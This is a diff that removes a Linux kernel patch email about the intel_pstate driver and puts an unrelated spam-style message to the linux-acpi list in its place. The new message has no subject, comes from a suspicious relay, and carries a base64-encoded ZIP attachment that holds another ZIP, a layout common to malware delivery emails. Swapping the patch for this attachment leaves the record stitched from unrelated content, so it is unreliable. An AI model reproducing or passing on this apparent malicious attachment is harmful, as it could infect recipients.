@@ -1,120 +1,74 @@
-From: Toshi Kani <toshi.kani@hpe.com>
-Subject: [PATCH 2/3] intel_pstate: convert to use acpi_match_oemlist()
-Date: Mon, 17 Jul 2017 15:59:11 -0600
-Message-ID: <20170717215912.26070-3-toshi.kani@hpe.com>
-References: <20170717215912.26070-1-toshi.kani@hpe.com>
+From: <h.piontek@mistravel.pl>
+Subject: (unknown)
+Date: Mon, 17 Jul 2017 23:02:44 -0000
+Message-ID: <150033256469.17373.16889371072313179672@permonline.ru>
+Mime-Version: 1.0
+Content-Type: application/zip; name="EMAIL_50994155839_linux-acpi.zip
+Content-Transfer-Encoding: base64
 Return-path: <linux-acpi-owner@vger.kernel.org>
-Received: from g4t3425.houston.hpe.com ([15.241.140.78]:57534 "EHLO
-        g4t3425.houston.hpe.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1751549AbdGQWIb (ORCPT
-        <rfc822;linux-acpi@vger.kernel.org>); Mon, 17 Jul 2017 18:08:31 -0400
-In-Reply-To: <20170717215912.26070-1-toshi.kani@hpe.com>
+Received: from dsl-188-17-153-147.permonline.ru ([188.17.153.147]:37674 "HELO
+        permonline.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org
+        with SMTP id S1751435AbdGQXCt (ORCPT
+        <rfc822;linux-acpi@vger.kernel.org>); Mon, 17 Jul 2017 19:02:49 -0400
+Content-Disposition: attachment
+Subject: 
 Sender: linux-acpi-owner@vger.kernel.org
 List-Id: linux-acpi@vger.kernel.org
-To: rjw@rjwysocki.net, bp@alien8.de
-Cc: mchehab@kernel.org, tglx@linutronix.de, srinivas.pandruvada@linux.intel.com, lenb@kernel.org, linux-acpi@vger.kernel.org, linux-edac@vger.kernel.org, linux-kernel@vger.kernel.org, Toshi Kani <toshi.kani@hpe.com>
+To: linux-acpi@vger.kernel.org
 
-Convert to use acpi_match_oemlist() for the platform type check.
-There is no change in functionality.
-
-Signed-off-by: Toshi Kani <toshi.kani@hpe.com>
-Cc: "Rafael J. Wysocki" <rjw@rjwysocki.net>
-Cc: Srinivas Pandruvada <srinivas.pandruvada@linux.intel.com>
-Cc: Len Brown <lenb@kernel.org>
-Cc: Borislav Petkov <bp@alien8.de>
-Cc: Thomas Gleixner <tglx@linutronix.de>
----
- drivers/cpufreq/intel_pstate.c |   64 ++++++++++++++++------------------------
- 1 file changed, 25 insertions(+), 39 deletions(-)
-
-diff --git a/drivers/cpufreq/intel_pstate.c b/drivers/cpufreq/intel_pstate.c
-index b7fb8b7..8f7703c 100644
---- a/drivers/cpufreq/intel_pstate.c
-+++ b/drivers/cpufreq/intel_pstate.c
-@@ -2458,39 +2458,31 @@ enum {
- 	PPC,
- };
- 
--struct hw_vendor_info {
--	u16  valid;
--	char oem_id[ACPI_OEM_ID_SIZE];
--	char oem_table_id[ACPI_OEM_TABLE_ID_SIZE];
--	int  oem_pwr_table;
--};
--
- /* Hardware vendor-specific info that has its own power management modes */
--static struct hw_vendor_info vendor_info[] __initdata = {
--	{1, "HP    ", "ProLiant", PSS},
--	{1, "ORACLE", "X4-2    ", PPC},
--	{1, "ORACLE", "X4-2L   ", PPC},
--	{1, "ORACLE", "X4-2B   ", PPC},
--	{1, "ORACLE", "X3-2    ", PPC},
--	{1, "ORACLE", "X3-2L   ", PPC},
--	{1, "ORACLE", "X3-2B   ", PPC},
--	{1, "ORACLE", "X4470M2 ", PPC},
--	{1, "ORACLE", "X4270M3 ", PPC},
--	{1, "ORACLE", "X4270M2 ", PPC},
--	{1, "ORACLE", "X4170M2 ", PPC},
--	{1, "ORACLE", "X4170 M3", PPC},
--	{1, "ORACLE", "X4275 M3", PPC},
--	{1, "ORACLE", "X6-2    ", PPC},
--	{1, "ORACLE", "Sudbury ", PPC},
--	{0, "", ""},
-+static struct acpi_oemlist oemlist[] __initdata = {
-+	{"HP    ", "ProLiant", 0, ACPI_SIG_FADT, all_versions, 0, PSS},
-+	{"ORACLE", "X4-2    ", 0, ACPI_SIG_FADT, all_versions, 0, PPC},
-+	{"ORACLE", "X4-2L   ", 0, ACPI_SIG_FADT, all_versions, 0, PPC},
-+	{"ORACLE", "X4-2B   ", 0, ACPI_SIG_FADT, all_versions, 0, PPC},
-+	{"ORACLE", "X3-2    ", 0, ACPI_SIG_FADT, all_versions, 0, PPC},
-+	{"ORACLE", "X3-2L   ", 0, ACPI_SIG_FADT, all_versions, 0, PPC},
-+	{"ORACLE", "X3-2B   ", 0, ACPI_SIG_FADT, all_versions, 0, PPC},
-+	{"ORACLE", "X4470M2 ", 0, ACPI_SIG_FADT, all_versions, 0, PPC},
-+	{"ORACLE", "X4270M3 ", 0, ACPI_SIG_FADT, all_versions, 0, PPC},
-+	{"ORACLE", "X4270M2 ", 0, ACPI_SIG_FADT, all_versions, 0, PPC},
-+	{"ORACLE", "X4170M2 ", 0, ACPI_SIG_FADT, all_versions, 0, PPC},
-+	{"ORACLE", "X4170 M3", 0, ACPI_SIG_FADT, all_versions, 0, PPC},
-+	{"ORACLE", "X4275 M3", 0, ACPI_SIG_FADT, all_versions, 0, PPC},
-+	{"ORACLE", "X6-2    ", 0, ACPI_SIG_FADT, all_versions, 0, PPC},
-+	{"ORACLE", "Sudbury ", 0, ACPI_SIG_FADT, all_versions, 0, PPC},
-+	{ } /* End */
- };
- 
- static bool __init intel_pstate_platform_pwr_mgmt_exists(void)
- {
--	struct acpi_table_header hdr;
--	struct hw_vendor_info *v_info;
- 	const struct x86_cpu_id *id;
- 	u64 misc_pwr;
-+	int idx;
- 
- 	id = x86_match_cpu(intel_pstate_cpu_oob_ids);
- 	if (id) {
-@@ -2499,21 +2491,15 @@ static bool __init intel_pstate_platform_pwr_mgmt_exists(void)
- 			return true;
- 	}
- 
--	if (acpi_disabled ||
--	    ACPI_FAILURE(acpi_get_table_header(ACPI_SIG_FADT, 0, &hdr)))
-+	idx = acpi_match_oemlist(oemlist);
-+	if (idx < 0)
- 		return false;
- 
--	for (v_info = vendor_info; v_info->valid; v_info++) {
--		if (!strncmp(hdr.oem_id, v_info->oem_id, ACPI_OEM_ID_SIZE) &&
--			!strncmp(hdr.oem_table_id, v_info->oem_table_id,
--						ACPI_OEM_TABLE_ID_SIZE))
--			switch (v_info->oem_pwr_table) {
--			case PSS:
--				return intel_pstate_no_acpi_pss();
--			case PPC:
--				return intel_pstate_has_acpi_ppc() &&
--					(!force_load);
--			}
-+	switch (oemlist[idx].data) {
-+	case PSS:
-+		return intel_pstate_no_acpi_pss();
-+	case PPC:
-+		return intel_pstate_has_acpi_ppc() && !force_load;
- 	}
- 
- 	return false;
+UEsDBBQDAAAIADGX8UpvOOpkyAsAAOQMAAAQAAAANjE4MDE1Mjc0MjgyLnppcL2XVzQcCBSGRyRY
+EpbFKNGiix69Rxe9hMGSJbpBsEFC9F7C6F1GG0IwCGYEEd3ovQyJbpgxOiPItoc9u+fs2Yc9Z+/3
+8N977v/+n99Il/gmLTEAQAYQzTp4dOSx9E3zNgBw3gkA/CoACW1PCydVb91nwm6+uFx9U04Nhr5R
+UI+/C8Lh3lpLtcj7+CqNFA2QH7EuPWhKzXmCi4XnAdSZh4gWVfKkM08LEVCnEFD3Yb3RMaNo4Nvk
+g5wcgPs7kTINggNF6jHq6BAPaw3hsHbXXqtiJ894Vi5SZgTdd7xHzIi0dykWJb8aKAsoubrM2+ro
+Hu0gnLgnvrweZq4x0pGSMvj5mUdj0DXKS5lfHtRuDBQwUGcXC6iws/punnHbqC8OEsfKLy6JOBYL
+fGNowi0XT1JrQmssbeY5o3KqJXfsEcLqNY/RInbFrr9/s10QBKSo7AIloMF3o1xEH5WWJ1EegvPK
+RNNQNZr4n3xysl0YbslBiYQ3WuipuFf33Y5qhzpMrCluZPBGIjCVhUHSRvallYg0qjLLOHFiujSC
+nYQecc5HheICnlxCptLNsYF1cb8BW9rCrM360ggJerUMyogBx/KhyZRVM/5idVOXtDcQeBMU9DmF
+X9sx28jJg5HEqmzn3Vm3VCIkqbkHcGrHQ2HIuE1zb4aanrO0Yoy631M6lj0GDunSs+WQM/cKtNeN
+D8Nykg9l8YzH3iEhca14pZgepv8dCp2lJFhMygpuU3cN59fshTM18sNk/KUJg3z8rJWqV0bmQKvN
+HfwOFzf36hQZX2SYjoODyu7MeAq6P8WsE6mf9Z2GlGq0i0Zp9s1krbBHWgHL5MVNxjY5KZF36AyD
+YzGP5cVZmJQI5jeNyZklxh/d/ir1dpqPbJ9HdVHnbVQRSYWz/AqurDV2o7X744cftCKIsG28Vsh3
+8vUs04rG6clUBMlLhpbiQyHzV99HsQi5mpFBJdLzMmtYb3MSOwZlJGjuQPdX5EfOOiGU44aL94YT
+VZXSidO/w8kNsi+KcVnYQrIT6BJx6ZQCgCqdqojnqCat/Lj7T2tBSYIRlH6t2mph3Jrt00L5s9F0
+MLYypqe4VAJPblCydLa6X4xmjJkwpvJN92pVVez0m84MDx6oRSScbHivkU8FJratDiC7c/0FA8Ey
+LL1gGR9U+iQsmeV6170/nV9/pdP7rmE7p45Z0zzy2TKU7qz2Lklsd02Sj5gUs9EMEUammKWZXKyC
+vblMtjw8oLp31dLhtSLcR/NKNO6HQzK/t3SE7hp7LD0cIssykp/LxfjONVXID0HfZVZCPzH2ur+8
+j0Cut3sDUi5T6NofD7GRU6Gx6Id2UmNsvcObNwbZQRIZMXDeQr6AOEl6vh/0uvQTIyUKTO1IZRes
+cCsByY3QHxrNOpL55BQrCknztqsFNMIp9SqmKFncJxd01MgyGBRjjTCNizTHpKKqa970kNdh6oDd
+tKIVfZk5WV38cmDVnhNQJzFCgzTNKyEKRbp69bNb4Rl70oBT8K1NZ3evwxK6mF6sSfCieI/mbjmP
+vBCHjKvKLQOpG1zF3//M6AuHNRBfHizsuf3wOKcomlBs+PiTBlcE+CsBBE/fo2LILNFea8bD4kc8
+rSXzyOV5yUdI1G4mnUnh/PETC07vwXW806HgebOn2DTPpm7+pXsz4i9CJBrwCvCFtNLw2xih8oX6
+eLHwifTeucDw9CFhGkcXWCopNiS/AoQRluW2oCXTcCrymPDHC7bh4tPpFYEnhQFny4reW8OBk3Kh
+ymhgzuiAo+XOsvwp/U8+dv8DhJBUioa/gvKwB/L8laxFNeGhv9EcZZPZY8x00eQygWuD+L70Y2JN
+1gfa5TrzOq+p5BWcl1xsHcmcjyoVsXH0vm4RcduVnJJvA3UlnAe/e2xdCAxHTltVOaZSX6hip+mQ
+kOmHDUsWwauCCguKAY3PZ7tqk63f4aLk9D9pUuVHBeUCoTsFI8U/dmu+venL5S0+ldXAOAkXk4p9
+an0MeRY/o84ztn39StsXJqyk1SxKLslqbioQrdw5HtOqJlk8YrlC6itMa9vm4pNtguDl6ZlLeOEd
+duMskKwzu3/qiRPN5tCTIeCCsg1e/uAahDsxfBnIXDMWIzCXKLcW811OHqfNKDPvlrP0WytrQgXB
+uGtR4wD1cJikKOk0l8vpPfS5lFkd3Mx1QZqvO/5oZx/H1zTLVI6ulMDfILIaJ2bhg9FU3N8z36oh
+Ma7+8oG2q7xdIe10sPfiVG+Vt1Mrpq1rZPBc2zBBuLYqnjeyQVl04CHitOHl+P5Hr+oilVrldD/L
+n5Ruy9Q6dem4c5z6vyqJiWvePLsHk2KaPfQGOgpMy1SN1NKlnF9u6ljEP0QbqYuIJblVmB3VrYAl
+qXJ37y8dzYjdXl91ZG6d8f3hkhmJR3h9+TyHQ0DykPAqtGkjk0Lf+RbCw6KVJTHlXPHj7tjJ2Oeu
+0Zg9SOBnm09fKTcvJEVYSZg2tmZ2bNm26k2rppdWFbxfI1fgy68pmYJH6YK/gTumoUsyWrsnbqfL
+TpbrliRPCqwfWYEHsN6+TgHTaliiYD62OD1OB/9L/Lp5tJ8Q6vCA10T4zubAllCIYFiR7hfOjO87
+uG9ug4h60487OD+iMPtZGwFhAiJQg9BLg4MHj7WgvITkKUKa+NWrNlvzFuXMugIUcP7VTI9v3+OU
+XfQJ+OuXDuqDWldCss6Fc0bbvMeL7o7SVgICAfRPjVOW95fDXMy5qw2O3H8FPJpPqMpaQA/hcqVF
+svwLRCLeCF2tKYeWXe416ybcF+4rKejquyrQLPF+wOGo9HzuJNbKb/Rjd0S1yBa3OLXS3B2kvGjd
+PgZG4TI83ujkvbqWFKYyy5lzrHChzXwnH5mlHioMer4cBNvrcWUOCffdQ64uIUG0FLYhczagmjnl
+R+azyDrIV8tGzdpzWRtLUg+6+YBdgXkWATY2P1b1h1qdCmDnzJ+QDhTy1E22icWWt572V2fnVY0Y
+TNJRmTf7ubwQ14FRK2f21WwXShrob9WFqLfgK4XiDJ8zwwZvKCedJ8Q/LT/jY+LfaeLASiiWRBNd
+d29MacvnU0hyWV+ItDYwYEMFfloQzO8AO3u+LSzRjkd8Epy+h3ywoWIZFWCwi+lcMOhYI78vzWJI
+ODAdLHroKVufj/bEwCJczrxDaIcZWjztrbZ93WO8W+VEUO0/nlRmUCyCQ56sB+mMRnnlyDCXkC4O
+hrZIz7Bhd5PuHJrNQMmHNuuOsA5BelXtfPXjCecfQJjDwlKo6RDMpNbcvISD6uT6dDJPYYn2Ixar
+Nu0T5Dtj0MSkptfCX5+nbG8wmrXEes0FN+qgf+ZKdzDSgs4ITD6Tyvjcwr8KdH7Q9WV0RmrEYtYB
+02M+gdaTemCAi6f0fuvQWusyS3XGxirFPHzd126Ktk/vcJEeTqNbv9bxeOkkpSqLNj1nb/8+f7tr
+cu3Wh50T5oiAQC+03Bt/afAYY4HbyX1fJevC2mVDxKwh9sCfVh3i7WTwabY+WMTIDlgZxNN+ripY
+3X8yrPZCybYOPxQcq/a+RbjeIdfnrrKHJCuYEmLkt16k3Atr8kHpa23SxdYwOmZWFdutj3GwHMna
+6LD92MABoX59xeCat3/cDire6ulB8jkrgIvl/d8nmn9d2UfF6BuuUWXAhjlT35mP/jjG6QuPhE7V
+Idws6pF9zeFpMMNePw9n1ll3ITZX/Xkb63OXNd8rsbb3n/Txq2C77wEvy1lO8TfHvxez5D/URW7T
+9O3vCy7cxek/r3SbXeTrRjk716IsExKaBuJN4CedEywKy0MCNmi+rj3XJ82LV5vRAzuXt5Ltvw7p
+9Q/bOiz8eOWrOhMDc5cuwNV1oKJEjrfViwejpzzKrIWZYC9Xw9r1CjcQqgC3URPhTBdPpqH0yO6W
+mEV9maYFbPuW13cEa9XrzJQO7vU/1w8sn2kOv3nZ/2sw/XcI3/5DtAWTGukS3VAm/qfGwQX4Y9hD
+S8MAf+sf5AD2339EAAYAYCaExujbBNHf1Uj3Fsnvnl+x/VWf3f7t+gVQSwECPwMUAwAACAAxl/FK
+bzjqZMgLAADkDAAAEAAkAAAAAAAAACCApIEAAAAANjE4MDE1Mjc0MjgyLnppcAoAIAAAAAAAAQAY
+AIBsGBNQ/9IBgGwYE1D/0gGAbBgTUP/SAVBLBQYAAAAAAQABAGIAAAD2CwAAAAA=
